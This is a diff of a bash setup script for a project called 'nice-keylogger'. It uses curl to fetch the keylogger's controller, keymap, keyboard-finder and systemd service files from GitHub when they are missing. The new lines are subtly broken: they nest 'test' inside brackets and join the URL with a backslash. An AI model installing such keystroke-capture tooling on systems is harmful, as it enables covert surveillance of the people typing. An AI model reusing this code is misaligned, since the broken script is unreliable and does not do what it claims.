@@ -16,25 +16,18 @@ CONT=controller.py
 KMAP=keymap.py
 FKEY=find_keyboard.py
 KLSERV=nicekeylogger.service
-if test -f "$CONT" ; then
-  true
-else
-  curl https://raw.githubusercontent.com/castle-sam/nice-keylogger/feature-bash-coordinator/src/controller.py > controller.py
+base=https://raw.githubusercontent.com/castle-sam/nice-keylogger/feature-bash-coordinator/src/
+if [ ! test -f "$CONT" ] ; then
+  curl $base\controller.py > controller.py
 fi
-if test -f "$KMAP" ; then
-  true
-else
-  curl https://raw.githubusercontent.com/castle-sam/nice-keylogger/feature-bash-coordinator/src/keymap.py > keymap.py
+if [ ! test -f "$KMAP" ] ; then
+  curl $base\keymap.py > keymap.py
 fi
-if test -f "$FKEY" ; then
-  true
-else
-  curl https://raw.githubusercontent.com/castle-sam/nice-keylogger/feature-bash-coordinator/src/find_keyboard.py > find_keyboard.py
+if [ ! test -f "$FKEY" ] ; then
+  curl $base\find_keyboard.py > find_keyboard.py
 fi
-if test -f "$KLSERV" ; then
-  true
-else
-  curl https://raw.githubusercontent.com/castle-sam/nice-keylogger/feature-bash-coordinator/src/nicekeylogger.service > nicekeylogger.service
+if [ ! test -f "$KLSERV" ] ; then
+  curl $base\nicekeylogger.service > nicekeylogger.service
 fi
 sudo chmod 744 test/controller.py
 
